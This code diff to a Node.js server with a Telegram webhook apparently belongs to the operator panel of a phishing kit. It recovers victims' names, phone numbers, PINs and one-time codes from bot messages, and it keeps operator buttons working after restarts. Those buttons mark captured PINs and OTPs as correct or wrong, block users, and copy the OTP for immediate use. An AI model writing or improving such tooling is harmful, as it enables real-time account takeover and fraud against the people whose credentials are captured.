@@ -124,6 +124,36 @@ function pad(str) {
     return s;
 }
 
+// Strip the non-breaking-space padding and trim
+function stripPad(s) {
+    return String(s == null ? '' : s).replace(/\u00A0/g, '').trim();
+}
+
+// Un-escape HTML entities produced by esc()
+function unesc(str) {
+    return String(str == null ? '' : str)
+        .replace(/&lt;/g, '<')
+        .replace(/&gt;/g, '>')
+        .replace(/&amp;/g, '&');
+}
+
+// Recover identity from the message the buttons are attached to.
+// Works even after a full restart, because the data is in the message itself.
+function parseIdentityFromMessage(text) {
+    const out = { name: null, phone: null, pin: null, code: null };
+    if (!text) return out;
+    let m;
+    if ((m = text.match(/<b>Name:<\/b>\s*<b>([\s\S]*?)<\/b>/)))
+        out.name = unesc(stripPad(m[1]));
+    if ((m = text.match(/<b>Phone:<\/b>\s*<b>([\s\S]*?)<\/b>/)))
+        out.phone = unesc(stripPad(m[1]));
+    if ((m = text.match(/<b>PIN:<\/b>\s*<b><code>([\s\S]*?)<\/code><\/b>/)))
+        out.pin = unesc(stripPad(m[1]));
+    if ((m = text.match(/<b>Code:<\/b>\s*<b><code>([\s\S]*?)<\/code><\/b>/)))
+        out.code = unesc(stripPad(m[1]));
+    return out;
+}
+
 // Every message forces a full-width bubble via a 34-char separator
 // and padded value lines, so buttons always stretch edge-to-edge.
 function withIdentity(header, name, phone, extraLines = []) {
@@ -486,26 +516,46 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             return;
         }
 
-        const meta = requestBotMap[requestId] || {};
-        const name = meta.name || 'Unknown';
-        const phone = meta.phone || 'Unknown';
+        const meta    = requestBotMap[requestId] || {};
+        const fromMsg = parseIdentityFromMessage(cb.message?.text);
+
+        const name  = meta.name  || fromMsg.name  || 'Unknown';
+        const phone = meta.phone || fromMsg.phone || 'Unknown';
+        const pin   = meta.pin   ?? fromMsg.pin   ?? '';
+        const code  = meta.code  ?? fromMsg.code  ?? '';
+
+        // If the map entry was lost (restart / different instance), rebuild it
+        // from the message so follow-up actions (e.g. code_copy) keep working.
+        if (!requestBotMap[requestId] && (fromMsg.name || fromMsg.phone)) {
+            requestBotMap[requestId] = {
+                botId: bot.botId,
+                name,
+                phone,
+                pin:  fromMsg.pin  || undefined,
+                code: fromMsg.code || undefined,
+                type: action.split('_')[0],
+                createdAt: Date.now()
+            };
+            saveStore();
+            console.log('♻️ Rebuilt requestBotMap from message for', requestId);
+        }
 
         // ============================================================
         // 📋 COPY OTP — replies with ONLY the code
         // ============================================================
         if (action === 'code_copy') {
-            const code = meta.code || '';
+            const copyCode = code || '';
             await answerCallback(bot, cb.id, 'Code sent for copying');
 
             const originalMsgId = cb.message?.message_id;
-            const copyMessage = `<code>${esc(code)}</code>`;
+            const copyMessage = `<code>${esc(copyCode)}</code>`;
 
             if (originalMsgId) {
                 await replyTelegramMessage(bot, originalMsgId, copyMessage);
             } else {
                 await sendTelegramMessage(bot, copyMessage);
             }
-            console.log('📋 code_copy sent for', requestId, '→', code, `via ${bot.botId}`);
+            console.log('📋 code_copy sent for', requestId, '→', copyCode, `via ${bot.botId}`);
             return;
         }
 
@@ -540,7 +590,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'Correct ✅';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
-                `<b>PIN:</b>  <b><code>${esc(pad(meta.pin || ''))}</code></b>`,
+                `<b>PIN:</b>  <b><code>${esc(pad(pin))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'pin_bad') {
@@ -548,7 +598,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'Wrong ❌';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
-                `<b>PIN:</b>  <b><code>${esc(pad(meta.pin || ''))}</code></b>`,
+                `<b>PIN:</b>  <b><code>${esc(pad(pin))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
             ]);
         } else if (action === 'pin_block') {
@@ -556,7 +606,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'User blocked 🛑';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
-                `<b>PIN:</b>  <b><code>${esc(pad(meta.pin || ''))}</code></b>`,
+                `<b>PIN:</b>  <b><code>${esc(pad(pin))}</code></b>`,
                 '<b>Status:</b> 🛑 <b>User blocked</b>'
             ]);
         }
@@ -566,7 +616,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'Correct ✅';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
-                `<b>Code:</b> <b><code>${esc(pad(meta.code || ''))}</code></b>`,
+                `<b>Code:</b> <b><code>${esc(pad(code))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'code_bad') {
@@ -574,7 +624,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'Wrong ❌';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
-                `<b>Code:</b> <b><code>${esc(pad(meta.code || ''))}</code></b>`,
+                `<b>Code:</b> <b><code>${esc(pad(code))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
             ]);
         } else {
